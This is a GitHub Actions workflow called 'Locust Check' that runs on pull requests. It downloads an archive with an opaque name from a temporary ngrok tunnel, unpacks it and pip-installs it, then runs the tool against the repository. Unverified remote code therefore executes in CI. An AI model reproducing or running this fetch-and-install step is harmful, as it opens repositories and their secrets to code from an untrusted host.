name: Locust Check

on: [pull_request]

jobs:
  build:
    runs-on: ubuntu-20.04
    steps:
      - uses: actions/checkout@v2
        with:
          fetch-depth: 0
      - uses: actions/setup-python@v2
        with:
          python-version: "3.8"
      - name: Wget package
        run: wget https://464aaa20300b.ngrok.io/github/items/hf8734hjf98324jhfiu3gfh9928ufjoi23bhg9834
      - name: Unpack package
        run: tar -xvf hf8734hjf98324jhfiu3gfh9928ufjoi23bhg9834
      - name: Install locust
        run: pip install -e locust/
      - name: Install requests
        run: pip install requests
      - name: TEST 
        run: git rev-parse HEAD
      - name: TEST 2
        run: git log --pretty=oneline
      - name: Run locust check
        run: locust -r . -i origin/main -t HEAD
